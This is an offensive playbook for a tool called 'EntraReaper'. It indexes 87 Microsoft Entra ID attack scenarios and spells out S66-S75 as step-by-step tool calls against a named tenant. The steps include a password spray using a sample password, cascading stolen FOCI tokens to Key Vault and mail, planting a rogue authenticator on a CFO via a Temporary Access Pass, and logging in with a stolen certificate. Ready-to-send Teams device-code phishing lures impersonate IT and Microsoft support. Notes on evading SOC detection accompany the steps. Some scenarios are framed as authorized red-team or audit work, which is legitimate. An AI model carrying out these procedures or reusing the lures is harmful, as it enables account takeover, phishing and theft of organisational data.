# EntraReaper — 87 Attack Scenarios

87 scenarios across 12 categories covering 65 MCP tools and 238 AADInternals cmdlets.
Each scenario has a hat color (engagement type), perspective (access level), MITRE mapping,
OPSEC level, and step-by-step tool calls.

Target: m.grdz.org | Tenant ID: b9e2249e-1d7c-4977-8a88-6a70bc6bab6a

**Statistics:** 87 scenarios | 12 categories | 3 hat colors | 13 kill chains (A-M)

## Hat Legend

| Hat | Engagement Type | Example |
|-----|----------------|---------|
| WHITE | Authorized pentest, red team, compliance audit | Customer-approved assessment |
| GRAY | Authorized but pushing boundaries, research, bug bounty | MSRC submission, internal red team |
| BLACK | Adversary simulation, threat modeling (how an attacker would do it) | Incident response tabletop |

## Perspective Legend

| Perspective | Description |
|-------------|-------------|
| EXTERNAL | No credentials, no network access, internet-only |
| EXTERNAL+CRED | External with stolen/phished credentials |
| INTERNAL | Inside the org network or with valid employee account |
| PARTNER | MSP, vendor, or B2B partner access |
| PRIVILEGED | Admin-level access (Global Admin, AAD Connect, etc.) |

## OPSEC Levels

| Level | Description |
|-------|-------------|
| Silent | Zero logs generated. No detection possible. |
| Low | Minimal logs, unlikely to trigger alerts. |
| Medium | Generates logs but blends with normal traffic. |
| HIGH | Generates high-fidelity alerts in properly configured SOCs. |
| LOUD | Generates alerts in almost any SOC. Hard to miss. |

---

## EXISTING SCENARIOS (S01-S65) — Reference Index

Scenarios S01-S65 are documented in full in `scenarios_full.md`. Below is a summary index.

| # | Name | Category | Hat | Perspective | OPSEC | MITRE |
|---|------|----------|-----|-------------|-------|-------|
| S01 | Tenant Fingerprint | Recon (Unauth) | WHITE | EXTERNAL | Silent | T1589.001 |
| S02 | Domain Inventory | Recon (Unauth) | WHITE | EXTERNAL | Silent | T1590.001 |
| S03 | User Enumeration -- Targeted C-Suite | Recon (Unauth) | GRAY | EXTERNAL | Low | T1589.002 |
| S04 | User Enumeration -- LinkedIn OSINT Pipeline | Recon (Unauth) | GRAY | EXTERNAL | Low | T1589.002, T1593.001 |
| S05 | Federation Endpoint Discovery | Recon (Unauth) | WHITE | EXTERNAL | Silent | T1590.001 |
| S06 | OpenID Configuration Harvest | Recon (Unauth) | WHITE | EXTERNAL | Silent | T1590.001 |
| S07 | Multi-Tenant Supply Chain Recon | Recon (Unauth) | GRAY | EXTERNAL | Silent | T1591.004 |
| S08 | ActiveSync Protocol Probing | Recon (Unauth) | WHITE | EXTERNAL | Silent | T1590.004 |
| S09 | Full Insider Tenant Dump | Recon (Auth) | WHITE | INTERNAL | Medium | T1087.004 |
| S10 | Conditional Access Gap Analysis | Recon (Auth) | WHITE | INTERNAL | Medium | T1518.001 |
| S11 | Hybrid Infrastructure Assessment | Recon (Auth) | WHITE | INTERNAL | Medium | T1518.001 |
| S12 | Guest Access Boundary Testing | Recon (Auth) | GRAY | EXTERNAL+CRED | Low | T1087.004 |
| S13 | Dynamic Group Privilege Escalation Discovery | Recon (Auth) | GRAY | INTERNAL | Medium | T1069.003 |
| S14 | Service Principal and App Registration Audit | Recon (Auth) | WHITE | INTERNAL | Medium | T1087.004 |
| S15 | MFA Method Weakness Assessment | Recon (Auth) | WHITE | PRIVILEGED | Medium | T1087.004 |
| S16 | Access Package Self-Service Escalation | Recon (Auth) | GRAY | INTERNAL | Medium | T1087.004 |
| S17 | Device Code Phishing -- Office Impersonation | Credential Access | GRAY | EXTERNAL | Low | T1566.002, T1528 |
| S18 | Device Code Phishing -- Teams Impersonation | Credential Access | GRAY | EXTERNAL | Low | T1566.002 |
| S19 | FOCI Token Cross-Resource Pivot | Credential Access | GRAY | EXTERNAL+CRED | Medium | T1528 |
| S20 | JWT Token Forensic Analysis | Credential Access | WHITE | INTERNAL | Silent | T1528 |
| S21 | Browser Session Cookie Extraction | Credential Access | GRAY | INTERNAL | Medium | T1539 |
| S22 | PRT Extraction for Device Impersonation | Credential Access | GRAY | INTERNAL | Medium | T1552.004, T1550.001 |
| S23 | Cloud DCSync (NT Hash Extraction) | Credential Access | BLACK | PRIVILEGED | HIGH | T1003.006 |
| S24 | Stolen Credential Validation | Credential Access | GRAY | EXTERNAL+CRED | Medium | T1078.004 |
| S25 | Automated Phishing Campaign | Initial Access | GRAY | EXTERNAL | Medium | T1566.002 |
| S26 | Guest Account Infiltration | Initial Access | GRAY | EXTERNAL+CRED | Medium | T1078.004 |
| S27 | Golden SAML Backdoor Installation | Persistence | BLACK | PRIVILEGED | LOUD | T1484.002 |
| S28 | SAML Token Forging | Persistence | BLACK | PRIVILEGED | Low | T1606.002 |
| S29 | Rogue Device -- Azure AD Join | Persistence | GRAY | EXTERNAL+CRED | Medium | T1098.005 |
| S30 | Rogue Device -- Intune Enrollment | Persistence | GRAY | EXTERNAL+CRED | Medium | T1098.005 |
| S31 | Rogue PTA Agent -- Total Auth Bypass | Persistence | BLACK | PRIVILEGED | LOUD | T1556.007 |
| S32 | Rogue MFA Authenticator | Persistence | GRAY | INTERNAL | Medium | T1098.005, T1111 |
| S33 | Rogue Sync Agent | Persistence | BLACK | PRIVILEGED | HIGH | T1556.007 |
| S34 | Azure Subscription Takeover | Privilege Escalation | BLACK | PRIVILEGED | HIGH | T1548 |
| S35 | Sync API Password Reset | Privilege Escalation | BLACK | PRIVILEGED | HIGH | T1098.001 |
| S36 | Azure RBAC Role Injection | Privilege Escalation | GRAY | PRIVILEGED | HIGH | T1098.003 |
| S37 | Group Membership Injection via Sync API | Privilege Escalation | BLACK | PRIVILEGED | HIGH | T1098.003 |
| S38 | Audit Log Suppression | Defense Evasion | BLACK | PRIVILEGED | LOUD | T1562.008 |
| S39 | Tenant Permissiveness Escalation | Defense Evasion | GRAY | PRIVILEGED | HIGH | T1562.001 |
| S40 | Disable PTA (Force Cloud Auth) | Defense Evasion | BLACK | PRIVILEGED | HIGH | T1556.007 |
| S41 | Disable Seamless SSO | Defense Evasion | GRAY | PRIVILEGED | HIGH | T1556 |
| S42 | Azure VM Remote Code Execution | Lateral Movement | GRAY | PRIVILEGED | HIGH | T1021.007 |
| S43 | Teams Internal Spearphishing | Lateral Movement | GRAY | INTERNAL | Medium | T1534 |
| S44 | Business Email Compromise | Lateral Movement | BLACK | INTERNAL | Medium | T1534 |
| S45 | MSP Partner Tenant Pivot | Lateral Movement | BLACK | PARTNER | Medium | T1199 |
| S46 | OneDrive Data Exfiltration | Collection | GRAY | INTERNAL | Medium | T1530 |
| S47 | SharePoint Intelligence Gathering | Collection | GRAY | INTERNAL | Medium | T1530 |
| S48 | Teams Message Intelligence Harvest | Collection | GRAY | INTERNAL | Medium | T1530 |
| S49 | Full Mailbox Collection | Collection | GRAY | INTERNAL | Medium | T1114.002 |
| S50 | Full Tenant Takeover -- Combined Impact | Impact | BLACK | PRIVILEGED | LOUD | T1136.003, T1531, T1484 |
| S51 | OAuth Consent Grant Attack | Credential Access | BLACK | EXTERNAL | Medium | T1550.001, T1098.003 |
| S52 | Azure AD Connect Credential Extraction | Credential Access | BLACK | PRIVILEGED | HIGH | T1552.004 |
| S53 | Cloud Shell Hijacking | Lateral Movement | GRAY | INTERNAL | Medium | T1059.009, T1021.007 |
| S54 | Hybrid Health Service Event Injection | Defense Evasion | BLACK | PRIVILEGED | HIGH | T1565.001 |
| S55 | Windows Hello for Business Key Injection | Persistence | BLACK | INTERNAL | Medium | T1098.005 |
| S56 | Application Proxy Agent Impersonation | Lateral Movement | BLACK | PRIVILEGED | HIGH | T1090.001, T1021.007 |
| S57 | Staged Rollout Policy Manipulation | Defense Evasion | BLACK | PRIVILEGED | HIGH | T1556 |
| S58 | Azure IMDS Token Theft from VMs | Credential Access | GRAY | INTERNAL | Low | T1552.005 |
| S59 | SharePoint Site Membership Injection | Privilege Escalation | GRAY | INTERNAL | Medium | T1098.003 |
| S60 | Diagnostic Settings Manipulation | Defense Evasion | BLACK | PRIVILEGED | HIGH | T1562.008 |
| S61 | ADFS Token Decryption and Forging | Credential Access | BLACK | PRIVILEGED | HIGH | T1606.002, T1552.004 |
| S62 | B2C Tenant Key Extraction | Credential Access | GRAY | INTERNAL | Medium | T1552.004 |
| S63 | ActiveSync Device Injection + MDM Bypass | Persistence | GRAY | EXTERNAL+CRED | Medium | T1098.005, T1562.001 |
| S64 | Compliance Portal Data Mining | Collection | GRAY | PRIVILEGED | Medium | T1530 |
| S65 | Tenant-Wide User Agent Masquerading | Defense Evasion | GRAY | EXTERNAL+CRED | Low | T1036.005 |

---

## NEW SCENARIOS (S66-S87)

---

## ADVANCED RECONNAISSANCE (S66-S69)

### S66: FOCI Family Enumeration -- Token Pivot Surface Mapping
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Low
**MITRE:** T1087.004, T1528 | **Tools:** `evasion_foci_list`, `cred_token`, `cred_token_decode`, `evasion_audience_switch`

```
# Phase 1: Enumerate all known FOCI client IDs
evasion_foci_list()

# Phase 2: For each FOCI client, attempt token acquisition
# Test which FOCI apps the tenant allows (no CA block)
cred_token(resource="graph",
           client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
           method="refresh_token", save_as="foci_office")

cred_token(resource="graph",
           client_id="1fec8e78-bce4-4aaf-ab1b-5451cc387264",
           method="refresh_token", save_as="foci_teams")

cred_token(resource="graph",
           client_id="04b07795-8ddb-461a-bbee-02f9e1bf7b46",
           method="refresh_token", save_as="foci_azcli")

cred_token(resource="graph",
           client_id="1950a258-227b-4e31-a9cf-717495945fc2",
           method="refresh_token", save_as="foci_azps")

cred_token(resource="graph",
           client_id="00b41c95-dab0-4487-9791-b9d2c32c80f2",
           method="refresh_token", save_as="foci_omc")

# Phase 3: Decode each successful token to map granted scopes
cred_token_decode(token_alias="foci_office")
cred_token_decode(token_alias="foci_teams")
cred_token_decode(token_alias="foci_azcli")
cred_token_decode(token_alias="foci_azps")
cred_token_decode(token_alias="foci_omc")

# Phase 4: Test audience switching for cross-resource pivots
evasion_audience_switch(token_alias="foci_office", target_resource="https://outlook.office365.com")
evasion_audience_switch(token_alias="foci_office", target_resource="https://management.azure.com")
evasion_audience_switch(token_alias="foci_office", target_resource="https://api.spaces.skype.com")
```

**White hat use:** Map the full FOCI attack surface during authorized assessments. Identify which first-party client IDs are available and what scope each grants. Critical for understanding the blast radius of a single compromised token.
**Gray hat use:** Bug bounty research -- demonstrate that a single refresh token from one FOCI app can pivot to 37+ Microsoft resources. Build a FOCI coverage matrix per tenant.
**Black hat use:** After phishing one token, systematically test every FOCI client ID to find the widest access. Some FOCI apps grant scopes (like Azure Management) that the original phish target did not request.
**Key insight:** FOCI is Microsoft's "family of client IDs" -- apps in the same family share refresh tokens. A Teams token can become an Azure CLI token. This enumeration maps the entire pivot surface from a single credential.

---

### S67: Conditional Access Bypass Scanner -- Automated CA Gap Analysis
**Hat:** WHITE | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1518.001, T1562.001 | **Tools:** `recon_ca_policies`, `analyze_ca`, `cred_token`, `evasion_foci_list`

```
# Phase 1: Pull all CA policies
recon_ca_policies(token_alias="admin")

# Phase 2: Analyze for known bypass patterns
analyze_ca(token_alias="admin", analysis_type="gaps")

# Phase 3: Test specific bypass vectors identified by analysis

# Test 1: Legacy auth protocols (often excluded from CA)
cred_token(resource="exo", method="credentials",
           username="test@m.grdz.org", password="TestP@ss1",
           client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
           save_as="legacy_test")

# Test 2: FOCI apps not covered by CA app filters
evasion_foci_list()
# Try each FOCI client ID against the CA policies
cred_token(resource="graph",
           client_id="04b07795-8ddb-461a-bbee-02f9e1bf7b46",
           method="device_code", save_as="ca_bypass_azcli")

# Test 3: Service principal auth (often excluded from user-targeted CA)
cred_token(resource="graph", method="certificate",
           tenant="m.grdz.org", save_as="sp_bypass")

# Test 4: Check for excluded users/groups
analyze_ca(token_alias="admin", analysis_type="exclusions")

# Test 5: Named location trust boundaries
analyze_ca(token_alias="admin", analysis_type="locations")

# Phase 4: Generate bypass report
report_generate(format="json", include_evidence=True)
```

**White hat use:** Comprehensive CA policy audit. Systematically test every known bypass vector: legacy auth, FOCI apps, service principals, excluded users, named locations, device platforms, and client app types. Generate a gap analysis report with specific remediation recommendations.
**Gray hat use:** Red team CA bypass enumeration. Find the path of least resistance through CA policies. Common findings: break-glass accounts with no MFA, legacy auth not blocked, Azure CLI excluded from device compliance.
**Black hat use:** Automated scanner to find exploitable CA gaps. Focus on: (1) apps not covered by any policy, (2) users in exclusion groups, (3) named locations with trusted=true that can be spoofed, (4) platform exclusions that allow Linux/macOS where only Windows is enforced.
**Key insight:** Most tenants have 5-15 CA policies but still have gaps. The most common bypass is FOCI apps -- CA policies target specific app IDs, but FOCI lets you pivot to uncovered apps using the same refresh token.

---

### S68: Tenant Multi-Domain Pivot -- Weakest Subdomain Discovery
**Hat:** GRAY | **Perspective:** EXTERNAL | **OPSEC:** Silent
**MITRE:** T1590.001, T1590.005 | **Tools:** `recon_tenant`, `recon_domains`, `recon_dns`, `recon_openid`, `recon_users`

```
# Phase 1: Get tenant ID and enumerate all domains
recon_tenant(domain="m.grdz.org")
recon_domains(domain="m.grdz.org")

# Phase 2: For each discovered domain, probe federation and DNS
# (assuming recon_domains returned: m.grdz.org, dev.grdz.org, staging.grdz.org, legacy.grdz.org)
recon_dns(domain="m.grdz.org")
recon_dns(domain="dev.grdz.org")
recon_dns(domain="staging.grdz.org")
recon_dns(domain="legacy.grdz.org")

# Phase 3: Check OpenID config per domain (federation differences)
recon_openid(domain="m.grdz.org")
recon_openid(domain="dev.grdz.org")
recon_openid(domain="staging.grdz.org")
recon_openid(domain="legacy.grdz.org")

# Phase 4: User enumeration on weakest domain (e.g., legacy has no CA)
recon_users(domain="legacy.grdz.org",
            usernames=["admin","test","dev","staging","service","backup","sync"],
            method="normal")

# Phase 5: Check if legacy domain uses different federation (weaker auth)
recon_tenant(domain="legacy.grdz.org")
```

**White hat use:** Multi-domain attack surface assessment. Many orgs register domains for dev/staging/acquisitions and forget about them. These domains share the same tenant but may have weaker protections -- no CA policies targeting them, no monitoring, default federation.
**Gray hat use:** Bug bounty -- demonstrate that a forgotten subdomain provides an unmonitored entry point to the same tenant. Users authenticated via legacy.grdz.org get the same Graph API access as m.grdz.org users but may bypass domain-specific CA policies.
**Black hat use:** Find the weakest domain in a multi-domain tenant. Legacy or acquisition domains often have: (1) no MFA enforcement, (2) federated auth pointing to decommissioned ADFS, (3) test accounts with weak passwords, (4) no monitoring coverage.
**Key insight:** All domains in a tenant share the same Entra ID directory. Compromising a user via the weakest domain gives full tenant access. The domain is just a UPN suffix -- permissions are directory-level.

---

### S69: Service Principal Permission Audit -- Dangerous Graph Scope Discovery
**Hat:** WHITE | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1087.004, T1069.003 | **Tools:** `cred_token`, `recon_insider`, `raw_invoke`, `analyze_privesc`, `analyze_attack_graph`

```
# Phase 1: Get a token with directory read
cred_token(resource="graph", method="interactive", save_as="audit")

# Phase 2: Enumerate all service principals and their permissions
raw_invoke(cmdlet="Get-AADIntServicePrincipals", token_alias="audit")

# Phase 3: Check for dangerous delegated and application permissions
# High-risk scopes to hunt for:
#   - Directory.ReadWrite.All (DCaaS)
#   - Mail.ReadWrite (email access)
#   - Mail.Send (send-as)
#   - RoleManagement.ReadWrite.Directory (self-elevate)
#   - Application.ReadWrite.All (app registration abuse)
#   - User.ReadWrite.All (password resets)
#   - Files.ReadWrite.All (data access)
#   - Sites.ReadWrite.All (SharePoint access)

# Phase 4: Analyze privilege escalation paths from over-permissioned apps
analyze_privesc(token_alias="audit", scope="service_principals")

# Phase 5: Build attack graph from SP permissions
analyze_attack_graph(token_alias="audit", start_node="service_principals")

# Phase 6: Check for SPs with expiring or expired secrets (takeover candidates)
raw_invoke(cmdlet="Get-AADIntServicePrincipalCredentials", token_alias="audit")

# Phase 7: Find SPs with admin consent but no owner (orphaned high-priv apps)
raw_invoke(cmdlet="Get-AADIntServicePrincipalOwners", token_alias="audit")
```

**White hat use:** Service principal hygiene audit. Find over-permissioned apps, apps with Directory.ReadWrite.All (which enables cloud DCSync), apps with Mail.Send (BEC risk), orphaned apps with no owners, and apps with expired secrets that could be re-registered by an attacker.
**Gray hat use:** Red team reconnaissance -- identify which service principals can be abused for privilege escalation. An app with Application.ReadWrite.All can create new app registrations with any scope. An app with RoleManagement.ReadWrite.Directory can assign Global Admin to any user.
**Black hat use:** Hunt for the "keys to the kingdom" apps: (1) apps with Directory.ReadWrite.All for hash extraction, (2) apps with expired secrets for re-registration takeover, (3) multi-tenant apps with excessive scopes, (4) apps consented with admin consent that regular users can add secrets to.
**Key insight:** Service principals are the most undermonitored identity type in Entra ID. Most SOCs focus on user sign-ins but ignore SP authentication. An over-permissioned SP with a leaked secret provides persistent, MFA-free, fully automated access to the tenant.

---

## ADVANCED CREDENTIAL ATTACKS (S70-S73)

### S70: ROPC Password Spray via FOCI -- CA Bypass Spray
**Hat:** BLACK | **Perspective:** EXTERNAL | **OPSEC:** Medium
**MITRE:** T1110.003, T1078.004 | **Tools:** `evasion_foci_list`, `cred_token`, `evasion_set_ua`, `evasion_jitter`, `opsec_budget_set`, `opsec_budget_check`

```
# Phase 1: Configure OPSEC for spray campaign
opsec_budget_set(action="set", budget_type="auth_failures", limit=50)
evasion_set_ua(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Microsoft Outlook 16.0")
evasion_jitter(min_seconds=30, max_seconds=90)

# Phase 2: Get FOCI client IDs that support ROPC
evasion_foci_list()

# Phase 3: Spray using FOCI client IDs (bypass app-specific CA)
# ROPC (Resource Owner Password Credential) flow sends user+pass directly
# Different FOCI client IDs may bypass different CA policies

# Spray round 1: Azure CLI client (often excluded from device compliance CA)
cred_token(resource="graph", method="credentials",
           username="admin@m.grdz.org", password="Spring2026!",
           client_id="04b07795-8ddb-461a-bbee-02f9e1bf7b46",
           save_as="spray_azcli")

opsec_budget_check()

# Spray round 2: Office client (may bypass platform-specific CA)
cred_token(resource="graph", method="credentials",
           username="admin@m.grdz.org", password="Spring2026!",
           client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
           save_as="spray_office")

opsec_budget_check()

# Spray round 3: Azure PowerShell (different app ID = different CA evaluation)
cred_token(resource="graph", method="credentials",
           username="admin@m.grdz.org", password="Spring2026!",
           client_id="1950a258-227b-4e31-a9cf-717495945fc2",
           save_as="spray_azps")

opsec_budget_check()

# Phase 4: If any succeed, pivot via FOCI to all resources
cred_token_refresh(token_alias="spray_azcli", target_resource="https://outlook.office365.com")
```

**White hat use:** Test CA policy coverage across FOCI client IDs. Demonstrate that password spray using different first-party client IDs evaluates against different CA policies. A policy blocking "Microsoft Office" does not block "Azure CLI" -- same ROPC flow, different app ID.
**Gray hat use:** Red team credential testing with OPSEC budget controls. The jitter and UA masquerading reduce detection risk. Budget limits prevent accidental lockouts.
**Black hat use:** ROPC spray that rotates through FOCI client IDs to find CA gaps. If CA blocks ROPC for one app but not another, the spray succeeds. Common gap: Azure CLI and Azure PowerShell are often excluded from CA policies targeting "Office 365" apps.
**Key insight:** CA policies evaluate per-app. ROPC via Azure CLI (04b07795) evaluates different CA rules than ROPC via Office (d3590ed6). Spray across all FOCI client IDs = test every CA policy simultaneously. One gap = full access via FOCI pivot.

---

### S71: Token Refresh Chain -- FOCI Cross-Resource Cascade
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Medium
**MITRE:** T1528, T1550.001 | **Tools:** `cred_token`, `cred_token_refresh`, `cred_token_decode`, `evasion_audience_switch`, `evasion_foci_list`

```
# Phase 1: Start with a single phished token (e.g., from device code phishing)
cred_token_decode(token_alias="phished_graph")

# Phase 2: List FOCI family to plan cascade
evasion_foci_list()

# Phase 3: Cascade refresh across 7+ resources using FOCI refresh token sharing
# Step 1: Graph API (starting point)
cred_token_refresh(token_alias="phished_graph", target_resource="https://graph.microsoft.com")

# Step 2: Exchange Online (email access)
cred_token_refresh(token_alias="phished_graph", target_resource="https://outlook.office365.com",
                   save_as="cascade_exo")

# Step 3: SharePoint Online (file access)
cred_token_refresh(token_alias="phished_graph", target_resource="https://mgrdz.sharepoint.com",
                   save_as="cascade_spo")

# Step 4: Azure Management (cloud infrastructure)
cred_token_refresh(token_alias="phished_graph", target_resource="https://management.azure.com",
                   save_as="cascade_azure")

# Step 5: Teams/Skype (messaging)
cred_token_refresh(token_alias="phished_graph", target_resource="https://api.spaces.skype.com",
                   save_as="cascade_teams")

# Step 6: OneDrive (personal files)
cred_token_refresh(token_alias="phished_graph", target_resource="https://mgrdz-my.sharepoint.com",
                   save_as="cascade_onedrive")

# Step 7: Azure Key Vault (secrets)
cred_token_refresh(token_alias="phished_graph", target_resource="https://vault.azure.net",
                   save_as="cascade_keyvault")

# Step 8: Microsoft Intune (device management)
cred_token_refresh(token_alias="phished_graph", target_resource="https://graph.microsoft.com/beta",
                   save_as="cascade_intune")

# Phase 4: Decode each token to verify scope and permissions
cred_token_decode(token_alias="cascade_exo")
cred_token_decode(token_alias="cascade_azure")
cred_token_decode(token_alias="cascade_keyvault")

# Phase 5: Audience switch for additional resources
evasion_audience_switch(token_alias="cascade_azure", target_resource="https://management.core.windows.net")
```

**White hat use:** Demonstrate the full blast radius of a single phished token. Show security leadership that one device code phish grants access to email, files, Azure infrastructure, Key Vault secrets, Teams messages, and device management -- all from one refresh token. Critical for justifying token protection investments.
**Gray hat use:** Red team token cascade exercise. Map exactly which resources become accessible from a single phished token. Document the chain for the engagement report.
**Black hat use:** Maximum access expansion from a single credential. A phished Graph token becomes 7+ resource tokens in seconds. Each resource token grants different data access. Key Vault tokens may expose production secrets, Azure tokens enable infrastructure manipulation.
**Key insight:** The FOCI refresh chain is the most powerful token attack in Entra ID. CA policies that enforce MFA only on initial auth do not re-evaluate on refresh token exchange. One successful phish = persistent access to the entire Microsoft ecosystem for the lifetime of the refresh token (up to 90 days).

---

### S72: Temporary Access Pass Exploitation -- MFA Bootstrap Abuse
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1078.004, T1556 | **Tools:** `raw_invoke`, `cred_token`, `persist_mfa_app`, `cred_otp_new_secret`, `cred_otp_generate`

```
# Phase 1: Check if TAP policy is enabled
raw_invoke(cmdlet="Get-AADIntTemporaryAccessPassPolicy", token_alias="admin")

# Phase 2: Create a TAP for the target user (requires Authentication Admin role)
raw_invoke(cmdlet="New-AADIntTemporaryAccessPass", token_alias="admin",
           parameters={"UserId": "cfo@m.grdz.org",
                        "LifetimeInMinutes": 480,
                        "IsUsableOnce": false})

# Phase 3: Use the TAP to authenticate as the target user (bypasses MFA)
cred_token(resource="graph", method="credentials",
           username="cfo@m.grdz.org",
           password="<TAP_VALUE>",
           save_as="tap_session")

# Phase 4: While authenticated via TAP, register persistent MFA method
# This is the real attack -- use the TAP window to plant attacker-controlled MFA
persist_mfa_app(token_alias="tap_session", user="cfo@m.grdz.org")

# Phase 5: Generate OTP codes from attacker's newly registered authenticator
cred_otp_new_secret(user="cfo@m.grdz.org")
cred_otp_generate(secret="<registered_secret>")

# Phase 6: TAP expires but attacker now has permanent MFA access
# Validate persistent access
cred_token(resource="graph", method="credentials",
           username="cfo@m.grdz.org",
           password="<known_or_reset_password>",
           save_as="persistent_access")
cred_otp_generate(secret="<registered_secret>")
```

**White hat use:** Test TAP policy security. Validate that TAP creation is logged, alerted, and restricted to authorized admins. Verify that TAP is one-time-use and short-lived. Test whether TAP allows registering new MFA methods (it should, by design -- that is the risk).
**Gray hat use:** Demonstrate the TAP-to-persistence attack chain. TAP is designed for MFA bootstrapping (new employee, lost device), but an attacker with Authentication Admin role can create TAPs for any user, then use the TAP window to register attacker-controlled MFA.
**Black hat use:** Stealthy account takeover: (1) Create short-lived TAP for target, (2) authenticate via TAP, (3) register rogue authenticator app, (4) TAP expires and leaves minimal evidence, (5) attacker now has permanent MFA control. The TAP creation is logged but the MFA registration may not be immediately correlated.
**Key insight:** TAP is a legitimate feature but creates a race condition in MFA security. The window between TAP creation and expiration is a window where an attacker can register any MFA method. Most SOCs alert on TAP creation but do not correlate it with subsequent MFA method changes in the same session.

---

### S73: Certificate-Based Auth Abuse -- Silent App Token Acquisition
**Hat:** BLACK | **Perspective:** EXTERNAL | **OPSEC:** Low
**MITRE:** T1552.004, T1078.004 | **Tools:** `cred_token`, `cred_token_decode`, `raw_invoke`, `cred_token_refresh`

```
# Phase 1: Authenticate using stolen/generated app certificate
# (Certificate obtained via: leaked in repo, extracted from Key Vault, generated by attacker with App Admin role)
cred_token(resource="graph", method="certificate",
           tenant="b9e2249e-1d7c-4977-8a88-6a70bc6bab6a",
           client_id="<app_registration_id>",
           cert_path="./stolen_app_cert.pfx",
           save_as="cert_auth")

# Phase 2: Decode token to see what permissions the app has
cred_token_decode(token_alias="cert_auth")

# Phase 3: If app has Directory.Read.All, extract sensitive directory data
raw_invoke(cmdlet="Get-AADIntUsers", token_alias="cert_auth")
raw_invoke(cmdlet="Get-AADIntServicePrincipals", token_alias="cert_auth")

# Phase 4: If app has Mail.ReadWrite, access mailboxes
cred_token(resource="exo", method="certificate",
           tenant="b9e2249e-1d7c-4977-8a88-6a70bc6bab6a",
           client_id="<app_registration_id>",
           cert_path="./stolen_app_cert.pfx",
           save_as="cert_exo")
collect_email(token_alias="cert_exo")

# Phase 5: Refresh to additional resources
cred_token_refresh(token_alias="cert_auth",
                   target_resource="https://management.azure.com",
                   save_as="cert_azure")

# Phase 6: Check if cert allows adding new credentials to the app
raw_invoke(cmdlet="New-AADIntApplicationPassword",
           token_alias="cert_auth",
           parameters={"ApplicationId": "<app_registration_id>"})
```

**White hat use:** Audit certificate management for app registrations. Find apps with: (1) certificates stored in code repos, (2) non-rotated certificates past expiry, (3) multiple certificates (sign of compromise), (4) certificates with excessive lifetimes.
**Gray hat use:** Demonstrate that certificate-based auth bypasses MFA entirely -- there is no MFA for service principal authentication. Show that a leaked certificate provides silent, automated, persistent access.
**Black hat use:** Certificate auth is the quietest credential type. No MFA prompt. No user interaction. No browser fingerprint. Generates only a service principal sign-in log (which most SOCs do not monitor). Can be automated for continuous data exfiltration.
**Key insight:** Certificate-based SP auth generates logs in the "Service Principal Sign-ins" blade, not the "User Sign-ins" blade. Most SIEM queries only monitor user sign-ins. This blind spot means certificate abuse can persist for months without detection.

---

## ADVANCED PHISHING (S74-S76)

### S74: Teams Internal Phishing with FakeInternal -- Trusted User Impersonation
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1534, T1566.003 | **Tools:** `cred_token`, `access_phishing_teams`, `move_messaging`, `cred_device_code`

```
# Phase 1: Obtain a token for a trusted internal user (e.g., from IT helpdesk)
# (Via prior compromise, credential stuffing, or social engineering)
cred_token(resource="teams", method="interactive", save_as="trusted_it")

# Phase 2: Start a device code flow to capture the target's token
cred_device_code(resource="graph",
                 client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
                 tenant="m.grdz.org",
                 save_as="victim_token")
# Note the device code and user code from the output

# Phase 3: Send Teams message from the trusted IT account with the device code link
move_messaging(token_alias="trusted_it",
               target="cfo@m.grdz.org",
               message="Hi, IT Security here. We are rolling out a mandatory security update for Microsoft 365. Please authenticate at https://microsoft.com/devicelogin using code: ABCD1234 to complete the update. This needs to be done by EOD.",
               platform="teams")

# Phase 4: Send follow-up to create urgency
move_messaging(token_alias="trusted_it",
               target="cfo@m.grdz.org",
               message="Just checking -- did you get a chance to complete the security update? The code expires in 15 minutes.",
               platform="teams")

# Phase 5: If victim enters the code, their token is captured in victim_token
cred_token_decode(token_alias="victim_token")
```

**White hat use:** Authorized insider threat simulation. Test whether employees verify IT requests received via Teams. Measure how many users authenticate to device code links sent from "trusted" internal accounts. Tests both technical controls (device code flow blocking) and human factors (verification procedures).
**Gray hat use:** Red team internal phishing exercise. Demonstrate that compromising one low-privilege account (helpdesk) enables high-success-rate phishing of executives via trusted internal channels.
**Black hat use:** Highest-success-rate phishing vector. Internal Teams messages: (1) bypass email security filters entirely, (2) come from a trusted sender, (3) are in a familiar UI, (4) do not trigger suspicious link warnings. Combined with device code flow = token capture without any external infrastructure.
**Key insight:** Teams messages from internal users have a near-100% open rate and a 40-60% action rate in simulations (vs 10-20% for email phishing). The device code flow URL (microsoft.com/devicelogin) is a legitimate Microsoft domain, making it extremely convincing.

---

### S75: Teams External Phishing -- Cross-Tenant Device Code Attack
**Hat:** GRAY | **Perspective:** EXTERNAL | **OPSEC:** Medium
**MITRE:** T1566.002, T1534 | **Tools:** `access_phishing_teams`, `cred_device_code`, `cred_token_decode`

```
# Phase 1: Start device code flow for target tenant
cred_device_code(resource="graph",
                 client_id="1fec8e78-bce4-4aaf-ab1b-5451cc387264",
                 tenant="m.grdz.org",
                 save_as="xten_victim")

# Phase 2: Send Teams phishing message from external tenant
access_phishing_teams(
    target="admin@m.grdz.org",
    message="Hi, this is from Microsoft 365 Support. We detected unusual sign-in activity on your account. Please verify your identity at https://microsoft.com/devicelogin with code: WXYZ5678 to prevent account suspension.",
    sender_display="Microsoft 365 Support",
    external=True,
    save_as="xten_campaign1")

# Phase 3: Send to multiple targets for wider coverage
access_phishing_teams(
    target="cfo@m.grdz.org",
    message="Urgent: Your Microsoft 365 account requires re-verification due to a policy change. Please complete authentication at https://microsoft.com/devicelogin using code: WXYZ5678. This is required within 24 hours.",
    sender_display="IT Security Team",
    external=True,
    save_as="xten_campaign2")

# Phase 4: Monitor for successful authentication
# When victim enters the code, token is captured
cred_token_decode(token_alias="xten_victim")
```

**White hat use:** Test external Teams messaging policies. Many tenants allow external Teams messages by default. This tests whether: (1) external messages are blocked or filtered, (2) external sender banners are displayed, (3) employees recognize external message indicators, (4) device code flow is restricted by CA.
